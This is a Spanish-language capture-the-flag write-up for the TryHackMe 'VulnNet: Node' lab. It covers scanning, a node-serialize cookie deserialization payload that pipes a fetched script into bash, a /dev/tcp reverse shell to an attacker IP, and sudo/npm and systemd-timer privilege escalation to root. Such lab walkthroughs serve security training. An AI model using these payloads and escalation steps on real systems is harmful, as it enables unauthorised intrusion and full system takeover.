---
layout: single
title: VulnNet2 Node
excerpt: "After the previous breach, VulnNet Entertainment states it won't happen again. Can you prove they're wrong?"
date: 2022-05-02
classes: wide
header:
  teaser: /assets/images/thm-writeup-vuln/vuln_logo.png
  teaser_home_page: true
  icon: /assets/images/thm_ico.png
categories:
  - TryHackMe
  - infosec
tags:
  - Security
  - Linux
  - Web
  - Javascript
  - Privilege escalation
---

![logo](/assets/images/thm-writeup-vuln/vuln_logo.png)

[Link](https://tryhackme.com/room/vulnnetnode "vuln")

VulnNet Entertainment has moved its infrastructure and now they're confident that no breach will happen again. You're tasked to prove otherwise and penetrate their network.

    Difficulty: Easy
    Web Language: JavaScript

This is again an attempt to recreate some more realistic scenario but with techniques packed into a single machine. Good luck!

    Author: SkyWaves
    Discord: SkyWaves#1397

---

## 1. Fase de reconocimiento

- Para conocer a que nos estamos enfrentando lanzamos el siguiente comando:

```css
ping -c 1 {ip}
```

![ping](/assets/images/thm-writeup-vuln/vuln_ping.png)

- De acuerdo con el ttl=63 sabemos que nos estamos enfrentando a una máquina con sistema operativo Linux.

---

## 2. Enumeración / Escaneo

- Escaneo de la totalidad de los **_65535_** puertos de red el cual guardamos en un archivo en formato **_nmap_** con el siguiente comando:


└─# nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn {ip} -oN allports
```

![nmap_allports](/assets/images/thm-writeup-vuln/vuln_nmap_allports.png)

---

- De acuerdo con el escaneo anterior, se encuentran el siguiente puerto abierto; 8080 (htp)

- Escaeno de vulnerabilidades sobre los puerto 8080:


nmap -v -A -sC -sV -Pn {ip} -p22,80 --script vuln

```

---

- Whatweb nos da la siguiente información:


whatweb {ip}
```

![what_web](/assets/images/thm-writeup-vuln/vuln_whatweb.png)

---

- Revisión de la URL **_<http://10.10.8.158:8080>_**:

![URL](/assets/images/thm-writeup-vuln/vuln_web.png)

- Buscando el la ruta **_robots.txt_**, no se encontró nada interesante:

![URL](/assets/images/thm-writeup-vuln/vuln_robots_txt.png)

---

## 3. WFUZ

- Escaeno de subdominios con wfuzz:


└─# wfuzz --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 10.10.8.158:8080/FUZZ/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.8.158:8080/FUZZ/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000002:   200        0 L      706 W      7577 Ch     "#"
000000004:   200        0 L      706 W      7577 Ch     "#"
000000053:   200        112 L    229 W      2127 Ch     "login"
000000825:   200        112 L    229 W      2127 Ch     "Login"
```

- Con el anterior escaner encotramos una página de inicio de sesión **login - Login** :

![Login](/assets/images/thm-writeup-vuln/vuln_login.png)

---

## 4 Burpsuite

- De acuerdo con la información anterior procedemos a analizar con **_Burpsuite_** la resolución de la petición del **_login_**

![Burp](/assets/images/thm-writeup-vuln/vuln_cookie.png)

- Enviamos la petición al **_Repeater_**, paso seguido analizamos como se resuelve la petición y encontramos lo siguiente:

![Burp](/assets/images/thm-writeup-vuln/vuln_burp_guest.png)

- Decodificando la **_cookie_** de sesión encontramos el siguiente resultado:

![Burp_decode](/assets/images/thm-writeup-vuln/vuln_decode.png)

- Modificamos la petición de nuestra **_cookie_**, la codificamos en **_base 64_** y obervamos en la respuesta que nos recibe como usuario **_root_**.

![Burp](/assets/images/thm-writeup-vuln/vuln_burp_root.png)

## 5. Exploit

- Con la información obtenida procedemos a crear una **_rshell.sh_**, desde la máquina atacante, como se observa a continuación:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.9.0.27/2222 0>&1
```

- Compartimos la **_rshell-sh_**, desde un servidor en python como se observa a continuación:

```go
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

- Nos ponemos por escucha desde el puerto **_2222_**:

```go
└─# nc -nlvp 2222
listening on [any] 2222 ...
```

- Cargamos nuestro payload en burpsuite:


{"username":"\_$$ND_FUNC$$\_function (){\n \t require('child_process').exec('curl 10.9.0.27/rshell.sh | bash', function(error, stdout, stderr) { console.log(stdout) });}()","isGuest":false,"encoding": "utf-8"}
```

![Burp](/assets/images/thm-writeup-vuln/vuln_payload.png)

- Codificacmos el payload en base 64:

![Burp](/assets/images/thm-writeup-vuln/vuln_payload_64.png)

- Obtenemos nuestra reverse shell:

![Burp](/assets/images/thm-writeup-vuln/vuln_exploit.png)

## 6. Bandera de usuario

- Buscamos la forma de escalar privilegios con el comando **_sudo -l_**, en la salida podemos ver que se puerde ejecutar **_npm_** como **_usr_**:


sudo -l
Matching Defaults entries for www on vulnnet-node:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www may run the following commands on vulnnet-node:
    (serv-manage) NOPASSWD: /usr/bin/npm
```

---

- Buscamos en GTFOBins como podemos ejecutar el binario /npm como super usuario <https://gtfobins.github.io/gtfobins/npm/>

![gtfobins](/assets/images/thm-writeup-vuln/vuln_gtfobins.png)

- Ejecutamos lo indicado en la imagen anterior:


$ TF=$(mktemp -d)
$ echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
$ chmod +x $TF
$ sudo -u serv-manage /usr/bin/npm -C $TF --unsafe-perm i
$ locate user.txt
$ cat usr.txt
THM{[??????}
```

---

## 7. Bandera root

- Tratamiento de la bash para poder utilizar las diferentes funciones necesarias para trabajar de manera comoda:


$ script /dev/null -c bash
Script started, file is /dev/null

[crtl z]

/$ ^Z
zsh: suspended  nc -nlvp 2222

[reset y xterm]

~$> stty raw -echo; fg

[1]  + continued  nc -nlvp 2222
                              reset
reset: unknown terminal type unknown
Terminal type? xterm

[Exportamos las variables de entorno]

/$ export TERM=xterm
/$ export SHELL=bash

[Consultamos en la máquina atacante las filas y columnas]

stty size
27 97

[Pasamos la configuración anterior a la reverse shell]

:/$ stty rows 40 columns 123
```

---

- Buscamos la forma de escalar privilegios con el comando **_sudo -l_**, en la salida observamos lo siguiente:


serv-manage@vulnnet-node:~$ sudo -l
Matching Defaults entries for serv-manage on vulnnet-node:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User serv-manage may run the following commands on vulnnet-node:
    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl daemon-reload
```

---

- Modificamos el script **_vulnnet-auto.timer_**, cambiando el tiempo de ejecución de 30 a 1 minuto:

![Vulnet-timer](/assets/images/thm-writeup-vuln/vuln_root3.png)

---

- Modificamos el script **_vulnet-job.service_**, el cual es llamado con el script de la imagen anterior, para que cree una **_bash_** como usuario **_root_**

![Vulnet-job](/assets/images/thm-writeup-vuln/vuln_root2.png)

---

- En este punto procedemos a detener el servicio **_vulnnet-auto.timer_** y reiniciarlo como se observa a continuación:


serv-manage@vulnnet-node:~$ sudo /bin/systemctl stop vulnnet-auto.timer
serv-manage@vulnnet-node:~$ sudo /bin/systemctl daemon-reload
serv-manage@vulnnet-node:~$ sudo /bin/systemctl start vulnnet-auto.timer
```

---

- De acuerdo con la modificación del tiempo, esperamos 1 minuto y revisamos si la **_bashroot_**, fue creada:


serv-manage@vulnnet-node:~$ /tmp/bashroot -p
```

---

- Llegado a este punto tenemos acceso como usuario con privelegios **_root_**

![Vulnet-job](/assets/images/thm-writeup-vuln/vuln_root4.png)

---

## 7. Fuentes

- Writeup:

<https://titus74.com/thm-writeup-vulnnet-node/>

- Gtfobins

<https://gtfobins.github.io/gtfobins/npm/>
